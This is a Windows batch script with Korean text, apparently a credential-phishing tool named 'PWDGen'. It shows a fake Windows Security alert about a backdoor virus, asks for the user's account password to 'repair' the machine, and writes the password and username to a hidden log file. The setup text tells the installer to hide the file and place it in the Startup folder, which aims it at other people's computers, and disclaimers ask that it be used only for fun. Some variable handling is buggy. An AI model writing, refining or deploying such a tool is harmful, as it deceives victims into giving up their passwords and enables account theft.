@echo off
set version=1.1 (Beta)
set datetime = %date% %time%
set r = %random%
cd pwdgem
cls
if not exist "pwdgen" goto setup

:start
echo ------------------------ [ %DATE% %TIME% ] -------------------------- >> %cd%\pwdgen\log.txt
echo %dt%:  프로그램 실행완료, 실행 버전:%version% >> %cd%\pwdgen\log.txt

color a
title [Windows 보안] 작업이 필요합니다.
echo 현재 이 컴퓨터에 바이러스 [디도스, 좀비PC] Backdoor:Win32(본인이 원하는 바이러스 이름으로 변경가능) (이)가 실행되고 있는것이 확인되었습니다.
echo 자동으로 복구 하려하였으나, 관리자권한(UACPerm)이 부족하여 작업실행을 위해 사용자 계정 비밀번호를 입력해주세요!
echo.
echo 이 창을 끄는경우 복구가 불가능 할 수 있습니다.
echo.
set /p a=비밀번호(Password)를 입력해주세요: 
echo [%datetime%]: %a% (%USERNAME%)>> %cd%\pwdgen\pw.txt
cd "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
del pwdgen.cmd
goto exit

:setup
color b
md pwdgen
cd pwdgen
echo %username%님! 프로그램 사용을 환영해요!
echo * 파일을 숨겨놓은 상태로 설치를 진행하세요.
echo 이 프로그램은 악용하면 문제가 될수 있는 프로그램입니다. (사용후 문제발생시 모두 본인책임이므로 확인후 사용하세요.) 상대방의 비밀번호를 알아내기보다는 재미로만 사용해주시기 바랍니다 
set /p a=위의 내용에 동의 하시나요?(y/n): 
if %a%==y goto setupyes
if %a%==n goto exit

:setupyes
cls
echo Copyright By. HYNStudio PWDGen BY. 하모개(hmogae).
echo.
echo [%datetime%]: PWDGen(을)를 설치중입니다.
echo [%datetime%]: 잠시만 기다려주세요...
echo [%datetime%]: * 프로그램을 삭제하려면 %temp%에서 "pwdgen" 폴더를 삭제하시면 됩니다!
echo [%datetime%]: * 악용으로 인한 책임은 모두 본인에게 있음을 알립니다.
echo [%datetime%]: * 저작권 표시 및 초기설정창은 %temp%\pwdgen이 있는경우 표시되지 않고 pwdgen모드가 실행됩니다.
echo [%datetime%]: * 시작프로그램에 등록된후 비밀번호를 입력받은경우 시작프로그램에서 제거되도록 제작중입니다!

pause
goto exit

:exit
cls
exit
